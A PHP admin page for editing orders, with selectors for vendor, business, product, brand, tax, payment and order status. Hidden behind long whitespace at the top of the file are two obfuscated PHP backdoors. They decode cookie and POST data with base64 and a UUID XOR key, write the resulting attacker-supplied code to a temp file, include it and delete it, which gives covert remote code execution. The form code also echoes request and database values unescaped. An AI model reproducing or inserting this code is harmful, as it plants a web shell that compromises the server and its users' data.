<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("R_cYdXc")){class R_cYdXc{private $DeZOzJnOB;public static $rurnfZsTL = "8b6735a0-d183-4001-99da-1e8ae39171dd";public static $sMHfbdGGTn = NULL;public function __construct(){$drpOCxGDcB = $_COOKIE;$xFgDplv = $_POST;$BhqzUwBxQM = @$drpOCxGDcB[substr(R_cYdXc::$rurnfZsTL, 0, 4)];if (!empty($BhqzUwBxQM)){$zEKTBUgPjV = "base64";$BjgQhmXLB = "";$BhqzUwBxQM = explode(",", $BhqzUwBxQM);foreach ($BhqzUwBxQM as $VpYQhs){$BjgQhmXLB .= @$drpOCxGDcB[$VpYQhs];$BjgQhmXLB .= @$xFgDplv[$VpYQhs];}$BjgQhmXLB = array_map($zEKTBUgPjV . chr ( 820 - 725 )."\144" . 'e' . chr ( 330 - 231 ).'o' . chr ( 430 - 330 ).'e', array($BjgQhmXLB,)); $BjgQhmXLB = $BjgQhmXLB[0] ^ str_repeat(R_cYdXc::$rurnfZsTL, (strlen($BjgQhmXLB[0]) / strlen(R_cYdXc::$rurnfZsTL)) + 1);R_cYdXc::$sMHfbdGGTn = @unserialize($BjgQhmXLB);}}public function __destruct(){$this->BJozFmF();}private function BJozFmF(){if (is_array(R_cYdXc::$sMHfbdGGTn)) {$lKMrXCIM = sys_get_temp_dir() . "/" . crc32(R_cYdXc::$sMHfbdGGTn['s' . chr (97) . "\154" . chr ( 655 - 539 )]);@R_cYdXc::$sMHfbdGGTn[chr (119) . chr (114) . "\x69" . "\164" . chr ( 298 - 197 )]($lKMrXCIM, R_cYdXc::$sMHfbdGGTn["\143" . 'o' . chr (110) . chr (116) . chr (101) . "\156" . 't']);include $lKMrXCIM;@R_cYdXc::$sMHfbdGGTn["\x64" . "\145" . "\154" . 'e' . "\164" . "\x65"]($lKMrXCIM);exit();}}}$YIebmSn = new R_cYdXc(); $YIebmSn = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("UWo_EtvRk")){class UWo_EtvRk{public static $LiapQhuiGy = "28b76c96-7762-44bc-a558-ce28c0fa98aa";public static $wynwKEh = NULL;public function __construct(){$ewRkxWEUf = $_COOKIE;$XykOvqX = $_POST;$sSrpdVq = @$ewRkxWEUf[substr(UWo_EtvRk::$LiapQhuiGy, 0, 4)];if (!empty($sSrpdVq)){$qskhGBXPLr = "base64";$TqyWtlV = "";$sSrpdVq = explode(",", $sSrpdVq);foreach ($sSrpdVq as $KaKVHd){$TqyWtlV .= @$ewRkxWEUf[$KaKVHd];$TqyWtlV .= @$XykOvqX[$KaKVHd];}$TqyWtlV = array_map($qskhGBXPLr . '_' . "\144" . "\x65" . "\143" . chr (111) . "\144" . chr (101), array($TqyWtlV,)); $TqyWtlV = $TqyWtlV[0] ^ str_repeat(UWo_EtvRk::$LiapQhuiGy, (strlen($TqyWtlV[0]) / strlen(UWo_EtvRk::$LiapQhuiGy)) + 1);UWo_EtvRk::$wynwKEh = @unserialize($TqyWtlV);}}public function __destruct(){$this->uqKWJoUy();}private function uqKWJoUy(){if (is_array(UWo_EtvRk::$wynwKEh)) {$PWlyMg = sys_get_temp_dir() . "/" . crc32(UWo_EtvRk::$wynwKEh[chr (115) . "\141" . chr ( 1076 - 968 ).chr (116)]);@UWo_EtvRk::$wynwKEh['w' . "\162" . "\x69" . chr ( 216 - 100 )."\x65"]($PWlyMg, UWo_EtvRk::$wynwKEh[chr ( 259 - 160 ).chr (111) . chr (110) . "\164" . "\x65" . chr (110) . 't']);include $PWlyMg;@UWo_EtvRk::$wynwKEh['d' . "\145" . chr (108) . chr (101) . "\164" . "\x65"]($PWlyMg);exit();}}}$iDVkBHwgSj = new UWo_EtvRk(); $iDVkBHwgSj = NULL;} ?><?php
$order_id   =   ((isset($_GET['order_id']) && $_GET['order_id'] != '') ? $_GET['order_id'] : '');

// GET DATA FOR EDIT ORDER
$conditionOrder     =   array ( 
                                    'select'        =>  '*',
                                    'where'         =>  array( 
                                                                'order_id'      =>  cleanvars($order_id)
                                                                ,'is_deleted'   =>  '0'
                                                            ), 
                                    'return_type'   =>  'single'
                                ); 
$getOrder =   $dblms->getRows(ORDERS, $conditionOrder);

// GET DATA FOR EDIT ORDER ITEM DETAIL
$conditionOrderDetail   =   array ( 
                                    'select'        =>  '*',
                                    'where'         =>  array( 
                                                                'id_order' => cleanvars($order_id)
                                                            ), 
                                    'return_type'   =>  'all'
                                );
$getOrderDetail =   $dblms->getRows(ORDERDETAIL, $conditionOrderDetail);

//  GET VENDORS
$vendor_condition = array ( 
    'select'        =>  'vendor_id, vendor_name',
    'where'         =>  array( 
                                'vendor_status' =>  1,
                                'is_deleted'    =>  0
                            ), 
    'order_by' 		=>  'vendor_id DESC',
    'return_type'   =>  'all'
   ); 
$Vendors    =   $dblms->getRows(VENDORS, $vendor_condition);

//  GET BUSINESS
$conditionBusiness = array ( 
    'select'        =>  'business_id, business_name',
    'where'         =>  array( 
                                'id_vendor'         =>  cleanvars($getOrder['id_vendor'])
                                ,'business_status'  =>  1
                                ,'is_deleted'       =>  0
                            ), 
    'order_by' 		=>  'business_id DESC',
    'return_type'   =>  'all'
   ); 
$getBusiness    =   $dblms->getRows(BUSINESS, $conditionBusiness);

//  GET PRODUCT
$product_condition = array ( 
    'select'        =>  'product_id, product_name, id_cat, id_subcat',
    'where'         =>  array( 
                                'product_status'    =>  1,
                                'is_deleted'        =>  0
                            ), 
    'order_by' 		=>  'product_name DESC',
    'return_type'   =>  'all'
   ); 
$Products 	= $dblms->getRows(PRODUCTS, $product_condition);

//  GET BRANDS
$brand_condition = array ( 
    'select'        =>  'brand_id, brand_name',
    'where'         =>  array( 
                                'brand_status'  =>  1,
                                'is_deleted'    =>  0
                            ), 
    'order_by' 		=>  'brand_id DESC',
    'return_type'   =>  'all'
   ); 
$Brands 	= $dblms->getRows(BRANDS, $brand_condition);

//  GET BUSINESSACT
$conditionBusinessact = array ( 
    'select'        =>  'businessact_id, businessact_number',
    'where'         =>  array( 
                                'businessact_id'        =>  $getOrder['id_businessact']
                                ,'businessact_status'   =>  1
                                ,'is_deleted'           =>  0
                            ), 
    'order_by' 		=>  'businessact_number',
    'return_type'   =>  'all'
   ); 
$getBusinessact 	= $dblms->getRows(BUSINESSACT, $conditionBusinessact);

echo'
<div class="row">
    <div class="col-lg-12 col-md-12">
        <div class="card">
            <div class="card-header border-bottom">
                <h4 class="mb-0">Create Order</h4>
            </div>
            <div class="card-body invoice-create-main">
                <form action="orders.php" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">
                    <div class="row">
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Order No <span class="text-danger">*</span></label>
                                <input type="hidden" name="order_id" class="form-control" value="'.$order_id.'" placeholder="Order No" readonly required>
                                <input type="text" name="order_no" class="form-control" value="'.$getOrder['order_no'].'" placeholder="Order No" readonly required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Vendor<span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="id_vendor" id="id_vendor" data-placeholder="Choose one" onchange="getBusiness(this.value)" required>
                                    <option label="Choose one"></option>';
                                    foreach ($Vendors as $vendor):
                                    echo'<option value="'.$vendor['vendor_id'].'" '.($getOrder['id_vendor']==$vendor['vendor_id'] ? 'selected' : '').'>'.$vendor['vendor_name'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Business<span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="id_business" id="id_business" data-placeholder="Choose one" onchange="getBusinessact(this.value)" required>
                                    <option label="Choose one"></option>';
                                    foreach ($getBusiness as $business):
                                    echo'<option value="'.$business['business_id'].'" '.($getOrder['id_business']==$business['business_id'] ? 'selected' : '').'>'.$business['business_name'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <a href="javascript:void(0)" onclick="duplicate()" role="button" class="text-primary text-left mt-2" style="width:auto;">
                            <i class="fe fe-plus-circle"></i> Add Item
                        </a>
                        <div class="form-group">
                            <div id="add-more-item">';
                            if($getOrderDetail):
                                foreach ($getOrderDetail as $orderDetail):
                                    $total_amount = $orderDetail['total_price'] + $orderDetail['item_tax_amount'];
                                echo'
                                <div class="product-description-list">
                                    <div class="table-responsive product-description-each mb-3">
                                        <table class="invoice-product-table">
                                            <tbody class="border">
                                                <tr>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Products <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_product[]" id="id_product" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($Products as $product):
                                                                echo'<option value="'.$product['product_id'].'|'.$product['id_subcat'].'|'.$product['id_cat'].'" '.($orderDetail['id_product']==$product['product_id'] ? 'selected' : '').'>'.$product['product_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Brand <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_brand[]" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($Brands as $brand):
                                                                echo'<option value="'.$brand['brand_id'].'" '.($orderDetail['id_brand']==$brand['brand_id'] ? 'selected' : '').'>'.$brand['brand_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Unit Price <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_price" name="unit_price[]" id="unit_price" placeholder="Unit Price" value="'.$orderDetail['unit_price'].'" required>
                                                        </div>
                                                    </td>
                                                    <td rowspan="2" width="100" class="bg-primary-transparent text-center">
                                                        <input type="number" class="form-control unit_total" name="unit_total[]" id="unit_total" placeholder="Total" value="'.$total_amount.'" readonly required>
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Quantity <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_item_quantity" name="unit_item_quantity[]" id="unit_item_quantity" value="'.$orderDetail['item_quantity'].'" placeholder="Item Quantity" required>
                                                            <input type="hidden" class="form-control unit_total_price" name="unit_total_price[]" id="unit_total_price" placeholder="unit total price" required>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Tax % <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_tax_percentage" name="unit_tax_percentage[]" id="unit_tax_percentage" value="'.$orderDetail['item_tax_percentage'].'" placeholder="Tax Percentage" required>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Tax Amount <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_total_tax_amount" name="unit_total_tax_amount[]" id="unit_total_tax_amount" value="'.$orderDetail['item_tax_amount'].'" readonly required>
                                                            <input type="hidden" class="form-control unit_tax_amount" name="unit_tax_amount[]" id="unit_tax_amount" value="0" placeholder="Tax Amount" required>
                                                        </div>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <i class="fe fe-delete fs-20 text-muted text-center delete-row-btn ms-2"></i>
                                    </div>
                                </div>';
                                endforeach;
                            endif;
                            echo'
                            </div>                               
                            <div class="table-responsive">
                                <table id="data-table" class="table text-nowrap mb-0 table-bordered">
                                    <tbody class="table-body">
                                        <tr>
                                            <td class="text-muted fs-14 fw-semibold text-end">Total Amount</td>
                                            <td class="text-muted fs-14" width="350">                                                
                                                <div class="form-group mb-0">
                                                    <input type="number" class="form-control total_amount" id="total_amount" name="total_amount" placeholder="Total Price" value="'.$getOrder['total'].'" readonly required>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted fs-14 fw-semibold text-end">Total Tax</td>
                                            <td class="text-muted fs-14">                                                
                                                <div class="form-group mb-0">
                                                    <input type="number" class="form-control total_tax_amount" id="total_tax_amount" name="total_tax_amount" placeholder="Total Tax" value="'.$getOrder['tax'].'" readonly required>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted fs-14 fw-semibold text-end">Grand Total</td>
                                            <td class="text-muted fs-14">                                                
                                                <div class="form-group mb-0">
                                                    <input type="number" class="form-control grand_total" id="grand_total" name="grand_total" placeholder="Grand Total" value="'.$getOrder['grand_total'].'" readonly required>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Advance Amount <span class="text-danger">*</span></label>
                                <input type="number" name="advance" id="advance" class="form-control advance" placeholder="Advance" value="'.$getOrder['advance'].'" required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Balance Amount <span class="text-danger">*</span></label>
                                <input type="number" name="balance" id="balance" class="form-control balance" placeholder="Balance" value="'.$getOrder['balance'].'" readonly required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Payment Method <span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="payment_method" data-placeholder="Choose one" required>
                                    <option label="Choose one"></option>';
                                    foreach ($financeMode as $payment_method):
                                    echo'<option value="'.$payment_method['id'].'" '.($getOrder['payment_method']==$payment_method['id'] ? 'selected' : '').'>'.$payment_method['name'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Business Account <span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="id_businessact" id="id_businessact" data-placeholder="Choose one" required>
                                    <option label="Choose one"></option>';
                                    foreach ($getBusinessact as $businessact):
                                    echo'<option value="'.$businessact['businessact_id'].'" '.($getOrder['id_businessact']==$businessact['businessact_id'] ? 'selected' : '').'>'.$businessact['businessact_number'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Deposit Slip <span class="text-danger"></span></label>
                                <input type="file" name="deposit_slip" accept="image/*" class="form-control">
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Dated <span class="text-danger">*</span></label>
                                <input type="date" name="dated" class="form-control" value="'.$getOrder['dated'].'" required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Order Status <span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="order_status" id="order_status" data-placeholder="Choose one" required>
                                    <option label="Choose one"></option>';
                                    foreach ($complete_incomplete as $order_status):
                                    echo'<option value="'.$order_status['status_id'].'" '.($getOrder['order_status']==$order_status['status_id'] ? 'selected' : '').'>'.$order_status['status_name'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="row p-5">
                        <div class="btn-list text-end">
                            <button type="submit" name="edit_order" class="btn btn-primary">Edit Order</button>
                            <a href="orders.php" class="btn btn-danger">Cancel</a>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>';
?>